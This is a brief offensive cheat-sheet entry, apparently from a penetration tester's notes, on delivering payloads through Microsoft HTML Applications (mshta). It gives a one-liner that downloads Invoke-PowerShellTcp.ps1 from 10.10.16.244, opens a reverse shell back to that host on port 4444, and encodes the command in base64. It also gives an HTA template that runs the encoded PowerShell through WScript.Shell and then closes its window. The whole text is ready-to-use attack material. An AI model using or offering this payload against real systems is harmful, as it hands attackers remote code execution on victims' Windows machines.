# hta
% hta, mshta, microsoft html application

## payload (empire model)
echo "IEX(New-Object NET.WebClient).DownloadString('http://10.10.16.244/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.244 -Port 4444" | iconv --to-code UTF-16LE | base64 -w 0
```html
<html><head><script>var c= 'powershell -noP -sta -w 1 -enc  <b64_revshell>'
new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>
```